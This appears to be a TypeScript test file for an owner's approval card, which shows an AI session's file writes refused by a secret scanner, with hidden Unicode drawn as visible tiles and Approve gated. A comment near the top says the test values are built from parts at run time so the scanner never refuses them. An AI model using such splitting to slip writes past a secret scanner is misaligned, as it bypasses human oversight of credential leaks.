// the owner judges the hook's own capture → the server's display form drawn as it is, never the line as markup, never cut
describe("the secret-approval card", () => {
  const QUOTE = String.fromCharCode(34);
  const SCAN_BODY = "Approve this write once (R1) lets the write pass once, within 10 minutes of the answer. Decline (R2) when a line holds a real password or key.";
  const SCAN_PATH = "/Users/owner/Desktop/git/glass-atrium/monitor/src/server/queue/example-config.ts";
  const FAR = "2099-11-27T05:50:00.000Z";
  const REQUEST_ID = "5ca1ab1e-0000-4000-8000-000000000077";
  // the list facts the server hands while its store holds the request (owner-views.ts → getScanApprovalFacts)
  const getHeldFacts = (state: string, expiresAt: string, agentType: string | null = "glass-atrium-dev-front") => ({ state, lineCount: 1, expiresAt, path: SCAN_PATH, rule: "SEC-013", agentType, requestId: REQUEST_ID });
  // harmless parts joined at run time → an assignment the scanner never refuses
  const getLine = (value: string) => ["greeting = ", QUOTE, value, QUOTE, ";"].join("");
  const getRead = (lines: string[], agentType = "glass-atrium-dev-front") => ({
    path: SCAN_PATH, rule: "SEC-013", agentType,
    lines: lines.map((line) => ({ hash: getLineHash(line), ...getLineDisplay(line) })),
  });
  const scanItem = (overrides: Record<string, unknown> = {}) => buildItem({
    id: 77, title: "Secret-scan refusal: approve one write?", body: SCAN_BODY, isFreeTextAllowed: false, isApprovalClass: true, recommendedCode: "R2",
    options: [
      { code: "R1", label: "Approve this write once", pros: "The refused write lands as written.", cons: "A real secret in a line would be written to the file." },
      { code: "R2", label: "Decline", pros: "Nothing is written and the request is dropped.", cons: "The session rewrites the line." },
    ],
    scanApproval: getHeldFacts("pending", FAR), ...overrides,
  });
  const READY = (lines: string[], agentType?: string) => ({ status: "ready", data: getRead(lines, agentType) });
  const renderCard = (item: unknown, scanRead: unknown = READY([getLine("hello")])) => render("SheetBodyQ", { item, draft: {}, onDraft: () => undefined, cliPath: CLI_PATH, scanRead });
  const plates = (tree: RenderedNode) => byClass(tree, "scan-plate");
  const childrenOf = (node: RenderedNode) => (node.children ?? []).flat(Infinity as 1) as Array<RenderedNode | string>;
  // the host elements as the browser lays them out: component and fragment wrappers unwrapped
  const hostChildren = (node: RenderedNode): RenderedNode[] => childrenOf(node).flatMap((child) => {
    if (typeof child !== "object" || child === null) return [];
    return child.type === "Fragment" || /^[A-Z]/.test(String(child.type)) ? hostChildren(child) : [child];
  });
  // the words as read: collectText joins every node with a space
  const textOf = (node: RenderedNode | string | undefined) => collectText((node ?? null) as RenderedNode).replace(/\s+/g, " ").trim();
  const asSegment = (child: RenderedNode | string) => (typeof child === "string" ? { text: child } : { mark: collectText(child) });
  const optionInputs = (tree: RenderedNode) => findNodes(tree, (node) => node.type === "input" && node.props?.type === "radio");

  describe("a mark segment draws its tile, never the raw character", () => {
    const rows = [
      { name: "C0 control: TAB", cp: 0x09 }, { name: "C1 control", cp: 0x85 }, { name: "soft hyphen", cp: 0xad }, { name: "combining grapheme joiner", cp: 0x34f },
      { name: "Arabic letter mark", cp: 0x61c }, { name: "Hangul filler", cp: 0x115f }, { name: "Khmer inherent vowel", cp: 0x17b4 }, { name: "Mongolian vowel separator", cp: 0x180e },
      { name: "zero-width space", cp: 0x200b }, { name: "bidi override U+202E", cp: 0x202e }, { name: "bidi isolate U+2066", cp: 0x2066 }, { name: "line separator", cp: 0x2028 },
      { name: "no-break space", cp: 0xa0 }, { name: "byte order mark", cp: 0xfeff }, { name: "interlinear annotation", cp: 0xfff9 },
    ];
    for (const row of rows) {
      test(row.name, () => {
        const char = String.fromCodePoint(row.cp);
        const label = `U+${row.cp.toString(16).toUpperCase().padStart(4, "0")}`;
        const [plate] = plates(renderCard(scanItem(), READY([getLine(`a${char}b`)])));
        const texts = childrenOf(plate as RenderedNode).filter((child): child is string => typeof child === "string");
        const tiles = byClass(plate as RenderedNode, "scan-mark");
        assert.deepEqual(
          { isRawShown: texts.some((text) => text.includes(char)), tiles: tiles.map((tile) => [collectText(tile), tile.props.role, tile.props["aria-label"]]) },
          { isRawShown: false, tiles: [[label, "img", `hidden character ${label}`]] },
        );
      });
    }

    test("a trailing space is a tile at the plate's end", () => {
      const [plate] = plates(renderCard(scanItem(), READY([`${getLine("hello")} `])));
      assert.deepEqual(asSegment(childrenOf(plate as RenderedNode).at(-1)!), { mark: "U+0020" });
    });
  });

  test("each plate's children are the server's segments in order, nothing else", () => {
    const line = getLine(`a${String.fromCodePoint(0x200b)}b${String.fromCodePoint(0x202e)}c`);
    const [plate] = plates(renderCard(scanItem(), READY([line])));
    assert.deepEqual([childrenOf(plate as RenderedNode).map(asSegment), plate!.props.dir], [getPlain(getLineDisplay(line).segments), "ltr"]);
  });

  test("a line holding markup characters is drawn as its text, never as elements", () => {
    const line = getLine("**b** <b>x</b> ## h | a | ``` <a href=x>y</a>");
    const [plate] = plates(renderCard(scanItem(), READY([line])));
    const elements = findNodes(plate as RenderedNode, (node) => typeof node.type === "string" && node !== plate).map((node) => node.type);
    assert.deepEqual([elements, collectText(plate as RenderedNode)], [[], line]);
  });

  test("the literal text U+200B makes no tile, a real U+200B exactly one", () => {
    const tiles = (line: string) => byClass(plates(renderCard(scanItem(), READY([line])))[0] as RenderedNode, "scan-mark").length;
    assert.deepEqual([tiles(getLine("U+200B")), tiles(getLine(`x${String.fromCodePoint(0x200b)}y`))], [0, 1]);
  });

  test("3 captured lines make 3 plates in file order, each led by its own line head with the cue first", () => {
    const lines = [getLine("one"), "const x = process.env.HOME;", "const x = config.field;"];
    const tree = renderCard(scanItem({ scanApproval: { state: "pending", lineCount: 3, expiresAt: FAR } }), READY(lines));
    const blocks = byClass(tree, "scan-line").map((block) => [hostChildren(byClass(block, "scan-line-head")[0] as RenderedNode).map(textOf), collectText(plates(block)[0] as RenderedNode)] as const);
    assert.deepEqual(blocks.map(([head, plate]) => [head[0], plate]), [["Literal value", lines[0]], ["Env reference", lines[1]], ["Field reference", lines[2]]]);
    assert.deepEqual(blocks.map(([head]) => head[2]!.split(" · ")[1]), ["1 of 3", "2 of 3", "3 of 3"]);
  });

  test("the line head shows the server's length and classes", () => {
    const line = getLine(`Ab9 ${String.fromCodePoint(0xe9)}${"x".repeat(1200)}`);
    const { value } = getLineDisplay(line);
    const [head] = byClass(renderCard(scanItem(), READY([line])), "scan-line-head");
    assert.deepEqual(childrenOf(head as RenderedNode).map((child) => collectText(child as RenderedNode)), ["Literal value", `${value.length.toLocaleString("en-US")} characters`, "a–z, A–Z, 0–9, space, non-ASCII"]);
  });

  describe("the cue summary is the first part after the title", () => {
    const rows = [
      { name: "one literal line", lines: [getLine("hello")], expected: "⚠ The line assigns a literal value." },
      { name: "one reference line", lines: ["const x = other;"], expected: "The line assigns a reference, not a literal value." },
      { name: "some of several lines literal", lines: [getLine("a"), "const x = other;", getLine("b")], expected: "⚠ 2 of 3 lines assign a literal value." },
      { name: "none of several lines literal", lines: ["const x = other;", "const x = config.field;", "const x = process.env.HOME;"], expected: "None of the 3 lines assigns a literal value." },
    ];
    for (const row of rows) {
      test(row.name, () => {
        const [body] = byClass(renderCard(scanItem(), READY(row.lines)), "queue-sheet-body");
        const parts = hostChildren(body as RenderedNode);
        const titleAt = parts.findIndex((part) => part.type === "h3");
        assert.deepEqual([parts[titleAt + 1]?.props.className, textOf(parts[titleAt + 1])], ["scan-cue", row.expected]);
      });
    }
  });

  // [label, value] per row, in the sheet's order
  const factRows = (tree: RenderedNode) => {
    const cells = byClass(tree, "scan-facts").flatMap((list) => findNodes(list, (node) => node.type === "dt" || node.type === "dd").map((node) => textOf(node)));
    return cells.flatMap((cell, index) => (index % 2 === 0 ? [[cell, cells[index + 1]]] : []));
  };

  test("the facts carry the full path, the whole session id, the rule, the agent and the request id, none cut", () => {
    const facts = (agentType: string) => Object.fromEntries(factRows(renderCard(scanItem(), READY([getLine("hello")], agentType))));
    const shown = facts("glass-atrium-dev-front");
    assert.deepEqual(shown, {
      File: SCAN_PATH, Rule: "SEC-013 credential assignment", Session: `glass-atrium ${SESSION_ID}`, Agent: "glass-atrium-dev-front", Request: REQUEST_ID,
      Approval: "Once, within 10 minutes of your yes", Waits: `Until ${call<string>("getEndTimeQ", FAR)}`,
    });
    assert.deepEqual([Object.values(shown).some((value) => String(value).includes("…")), facts("").Agent], [false, "Main session"]);
  });

  // the scan read answers only while the request waits → the list facts carry what an approval binds; a gone request carries none
  describe("without the scan read the facts come from the list while the store holds the request", () => {
    const UNTIL = "2099-11-26T06:04:00.000Z";
    const approved = (facts: unknown) => scanItem({ status: "answered", answeredAt: "2026-11-26T05:54:00.000Z", answer: { code: "R1", text: null }, scanApproval: facts });
    const session = ["Session", `glass-atrium ${SESSION_ID}`];
    const rows = [
      {
        name: "approved, window open", item: approved(getHeldFacts("approved", UNTIL)),
        expected: [["File", SCAN_PATH], ["Rule", "SEC-013 credential assignment"], session, ["Agent", "glass-atrium-dev-front"], ["Request", REQUEST_ID], ["Approval", "Once, until 15:04"]],
      },
      {
        name: "approved for the main session", item: approved(getHeldFacts("approved", UNTIL, null)),
        expected: [["File", SCAN_PATH], ["Rule", "SEC-013 credential assignment"], session, ["Agent", "Main session"], ["Request", REQUEST_ID], ["Approval", "Once, until 15:04"]],
      },
      {
        name: "pending, the lines still reading", item: scanItem(), read: { status: "loading", data: null },
        expected: [["File", SCAN_PATH], ["Rule", "SEC-013 credential assignment"], session, ["Agent", "glass-atrium-dev-front"], ["Request", REQUEST_ID], ["Approval", "Once, within 10 minutes of your yes"], ["Waits", `Until ${call<string>("getEndTimeQ", FAR)}`]],
      },
      {
        name: "approved, then gone", item: approved({ state: "gone", lineCount: null, expiresAt: null, path: null, rule: null, agentType: null, requestId: null }),
        expected: [],
      },
    ];
    for (const row of rows) test(row.name, () => assert.deepEqual(factRows(renderCard(row.item, row.read ?? { status: "loading", data: null })), row.expected));
  });

  describe("the sheet's own scan read", () => {
    // one mount of the hook with its effects run and the reply settled
    const runRead = async (item: unknown, status: number) => {
      const paths: string[] = [];
      let reloads = 0;
      const stateful = createStatefulReact();
      const page = (await loadScreenModule(QUEUE_SRC, {
        React: stateful.react, URLSearchParams, window: { UI: uiStub(), location: { hash: "#queue" } },
        fetch: async (path: string) => { paths.push(path); return { status, json: async () => (status === 200 ? getRead([getLine("hello")]) : { error: "secret_request_gone" }) }; },
      })) as ScreenModule;
      stateful.resetCursor();
      (page.useScanReadQ as (item: unknown, onGone: () => void) => unknown)(item, () => { reloads += 1; });
      stateful.flushEffects();
      await new Promise((resolve) => setImmediate(resolve));
      return { paths, reloads };
    };

    test("after the yes no request reaches the scan read route", async () => {
      const item = scanItem({ status: "answered", answeredAt: "2026-11-26T05:54:00.000Z", answer: { code: "R1", text: null }, scanApproval: getHeldFacts("approved", FAR) });
      assert.deepEqual(await runRead(item, 409), { paths: [], reloads: 0 });
    });

    // the list still read pending → a 409 means the store dropped it: the list's next read shows that state at once
    const rows = [
      { name: "a 409 re-reads the list at once", status: 409, reloads: 1 },
      { name: "the lines on screen re-read nothing", status: 200, reloads: 0 },
      { name: "an outage re-reads nothing", status: 503, reloads: 0 },
    ];
    for (const row of rows) {
      test(row.name, async () => assert.deepEqual(await runRead(scanItem(), row.status), { paths: ["/api/queue/owner/items/77/scan-approval"], reloads: row.reloads }));
    }
  });

  test("the warning line stands directly above the options and the item body is not drawn", () => {
    const [body] = byClass(renderCard(scanItem()), "queue-sheet-body");
    const parts = hostChildren(body as RenderedNode);
    const optionsAt = parts.findIndex((part) => part.type === "fieldset");
    assert.equal(textOf(parts[optionsAt - 1]), "⚠ If any line holds a real password or key, decline.");
    assert.equal(collectText(body as RenderedNode).includes(SCAN_BODY), false);
  });

  describe("Approve stays closed until the captured lines are on screen; Decline stays open", () => {
    const past = "2020-01-01T00:00:00.000Z";
    const rows = [
      { name: "reading the capture", item: scanItem(), read: { status: "loading", data: null }, expected: [true, false] },
      { name: "the read failed", item: scanItem(), read: { status: "failed", data: null }, expected: [true, false] },
      { name: "the request expired", item: scanItem({ scanApproval: { state: "pending", lineCount: 1, expiresAt: past } }), read: { status: "loading", data: null }, expected: [true, false] },
      { name: "the request is gone", item: scanItem({ scanApproval: { state: "gone", lineCount: null, expiresAt: null } }), read: { status: "loading", data: null }, expected: [true, false] },
      { name: "the lines are on screen", item: scanItem(), read: READY([getLine("hello")]), expected: [false, false] },
    ];
    for (const row of rows) test(row.name, () => assert.deepEqual(optionInputs(renderCard(row.item, row.read)).map((input) => Boolean(input.props.disabled)), row.expected));

    test("key 1 picks nothing while Approve is closed, and picks it once open", () => {
      const pick = (isDisabled: boolean) => {
        const { calls, queue } = buildQueue({ sheet: { kind: "item", id: 77, item: scanItem() } });
        call("putPickedOptionQ", { queue, index: 0, root: { getElementById: (id: string) => (id === "queue-option-77-R1" ? { disabled: isDisabled } : null) } });
        return calls.filter(([name]) => name === "setDraft").length;
      };
      assert.deepEqual([pick(true), pick(false)], [0, 1]);
    });
  });

  describe("each state says its words in the lines' place", () => {
    const answered = (code: string, state: string, expiresAt: string | null) => scanItem({ status: "answered", answeredAt: "2026-11-26T05:54:00.000Z", answer: { code, text: null }, scanApproval: { state, lineCount: 1, expiresAt } });
    const rows = [
      { name: "reading the capture", item: scanItem(), read: { status: "loading", data: null }, expected: "Reading the captured lines…" },
      { name: "the read failed", item: scanItem(), read: { status: "failed", data: null }, expected: "⚠ The captured lines could not be read. Retry" },
      { name: "approved, window open", item: answered("R1", "approved", FAR), expected: "✓ Approved 14:54. The line was dropped; its hash remains." },
      { name: "approved, request gone", item: answered("R1", "gone", null), expected: "Approval ended: used, expired or lost in a monitor restart." },
      { name: "approved, window over", item: answered("R1", "approved", "2020-01-01T00:00:00.000Z"), expected: "Approval ended: used, expired or lost in a monitor restart." },
      { name: "declined", item: answered("R2", "gone", null), expected: "Declined 14:54. The line was dropped; nothing was written." },
      { name: "withdrawn", item: scanItem({ status: "withdrawn", scanApproval: { state: "gone", lineCount: null, expiresAt: null } }), expected: "The session withdrew the request. The line was dropped." },
      { name: "pending expired", item: scanItem({ scanApproval: { state: "pending", lineCount: 1, expiresAt: "2020-01-01T00:00:00.000Z" } }), expected: "Expired: no answer within 24 hours. The line was dropped." },
      { name: "gone after a monitor restart", item: scanItem({ scanApproval: { state: "gone", lineCount: null, expiresAt: null } }), expected: "Gone: the monitor restarted. The session must ask again." },
    ];
    for (const row of rows) {
      test(row.name, () => {
        const tree = renderCard(row.item, row.read ?? READY([getLine("hello")]));
        assert.deepEqual([textOf(byClass(tree, "scan-state")[0]), plates(tree).length], [row.expected, 0]);
      });
    }
  });

  test("an approval reads its server end time and turns ended one second past it", () => {
    const item = scanItem({ status: "answered", answeredAt: "2026-11-26T05:54:00.000Z", answer: { code: "R1", text: null }, scanApproval: { state: "approved", lineCount: 1, expiresAt: "2099-11-26T06:04:00.000Z" } });
    const [approval] = findNodes(renderCard(item), (node) => node.type === "dd" && collectText(node).startsWith("Once"));
    const end = Date.parse("2099-11-26T06:04:00.000Z");
    assert.deepEqual([textOf(approval as RenderedNode), call("getScanStateQ", item, end - 1000), call("getScanStateQ", item, end + 1000)], ["Once, until 15:04", "approved", "ended"]);
  });

  describe("Send answer on a request the server no longer holds", () => {
    const GONE_ANSWER = "Not approved: the request is gone. Nothing will pass.";

    test("says nothing passes, keeps the item open and re-reads the page at once", async () => {
      const page = (await loadScreenModule(QUEUE_SRC, {
        window: { UI: uiStub() },
        fetch: async () => ({ status: 409, json: async () => ({ error: "secret_request_gone" }) }),
      })) as ScreenModule;
      let busy: unknown = null;
      let reloads = 0;
      const isDone = await (page.sendActionQ as (deps: unknown) => Promise<boolean>)({
        id: 77, action: "answer", body: { code: "R1" }, setBusy: (next: unknown) => { busy = next; }, setDrafts: () => undefined, reload: () => { reloads += 1; },
      });
      assert.deepEqual([isDone, getPlain(busy), reloads], [false, { id: null, error: { id: 77, message: GONE_ANSWER } }, 1]);
    });

    // the re-read's list facts → the request ended; the owner's pick of Approve was made on lines no longer there
    const rows = [
      { name: "gone", facts: { state: "gone", lineCount: null, expiresAt: null }, line: "Gone: the monitor restarted. The session must ask again." },
      { name: "expired", facts: { state: "pending", lineCount: 1, expiresAt: "2020-01-01T00:00:00.000Z" }, line: "Expired: no answer within 24 hours. The line was dropped." },
    ];
    for (const row of rows) {
      test(`after the re-read reads ${row.name}: its line, no plate, Approve closed and unpicked, Send answer quiet, the alert kept`, () => {
        const { queue } = buildQueue({ drafts: { 77: { code: "R1" } }, busy: { id: null, error: { id: 77, message: GONE_ANSWER } } });
        const tree = renderSheet({ item: scanItem({ scanApproval: row.facts }), queue });
        const [approve] = optionInputs(tree);
        const [send] = buttonLabelled(tree, "Send answer");
        assert.deepEqual({
          line: textOf(byClass(tree, "scan-state")[0]), plates: plates(tree).length, facts: byClass(tree, "scan-facts").length,
          approve: [approve?.props.disabled, approve?.props.checked], isSendInk: String(send?.props.className).split(" ").includes("primary"),
          alerts: findNodes(tree, (node) => node.type === "p" && node.props?.role === "alert").map((node) => textOf(node)),
        }, { line: row.line, plates: 0, facts: 0, approve: [true, false], isSendInk: false, alerts: [`✕ ${GONE_ANSWER}`] });
      });
    }
  });

  // an ended request's tag word stands in for Approval where the list leaves the fact cell out
  describe("the list row carries facts, never the line", () => {
    const row = (item: unknown, isDone = false) => {
      const cells = call<{ tags: Array<{ text: string; narrowText?: string }>; fact: string | null }>("getRowCellsQ", { item, copies: [item], isDone }, false);
      return [cells.tags.map((tag) => tag.text), cells.fact, cells.tags.flatMap((tag) => (tag.narrowText ? [tag.narrowText] : []))];
    };
    const rows = [
      { name: "one pending line", item: scanItem(), expected: [["Approval"], "1 line", []] },
      { name: "three pending lines", item: scanItem({ scanApproval: { state: "pending", lineCount: 3, expiresAt: FAR } }), expected: [["Approval"], "3 lines", []] },
      { name: "an expired request", item: scanItem({ scanApproval: { state: "pending", lineCount: 1, expiresAt: "2020-01-01T00:00:00.000Z" } }), expected: [["Approval"], "Expired", ["Expired"]] },
      { name: "a gone request", item: scanItem({ scanApproval: { state: "gone", lineCount: null, expiresAt: null } }), expected: [["Approval"], "Gone", ["Gone"]] },
      { name: "done, approved", item: scanItem({ status: "delivered", answeredAt: FAR, answer: { code: "R1", text: null } }), isDone: true, expected: [["Approved"], "Decision", []] },
      { name: "done, declined", item: scanItem({ status: "delivered", answeredAt: FAR, answer: { code: "R2", text: null } }), isDone: true, expected: [["Declined"], "Decision", []] },
      { name: "done, withdrawn", item: scanItem({ status: "withdrawn" }), isDone: true, expected: [["Withdrawn"], "Decision", []] },
    ];
    for (const entry of rows) test(entry.name, () => assert.deepEqual(row(entry.item, entry.isDone), entry.expected));
  });

  test("the sheet reads the captured lines once, from the owner read route, only while the request is pending", async () => {
    const paths: string[] = [];
    const read = getRead([getLine("hello")]);
    const page = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams, window: { UI: uiStub(), location: { hash: "#queue" } },
      fetch: async (path: string) => { paths.push(path); return { status: 200, json: async () => read }; },
    })) as ScreenModule;
    const answer = getPlain(await (page.readScanLinesQ as (id: number) => Promise<unknown>)(77));
    assert.deepEqual([paths, answer], [["/api/queue/owner/items/77/scan-approval"], { status: "ready", data: read }]);
  });
});
